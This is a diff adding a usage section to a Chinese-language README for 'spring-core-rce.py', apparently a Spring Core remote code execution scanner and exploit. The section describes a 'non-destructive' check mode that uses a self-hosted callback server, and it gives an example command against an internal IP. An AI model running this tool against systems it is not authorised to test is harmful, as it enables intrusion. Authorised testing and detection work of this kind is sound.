@@ -39,6 +39,20 @@ optional arguments:
 
 ## 3.example
 
+>无损探测
+>
+>-u,--url    或者使用-f,--file批量探测
+>
+>-c,--check,参数为自建http服务，可用`python3 -m http.server 80`快速搭建一个web服务器
+>
+>主要在内网且要求无损探测漏洞的情况下使用
+
+```shell
+python3 spring-core-rce.py -u "http://172.26.155.18:8080/" --check "http://172.26.155.18"
+```
+
+![image-20220422153433867](README.assets/image-20220422153433867.png)
+
 >使用 -u指定url，-s指定操作系统  参数为：linux 或者 win，默认为linux
 
 ```shell
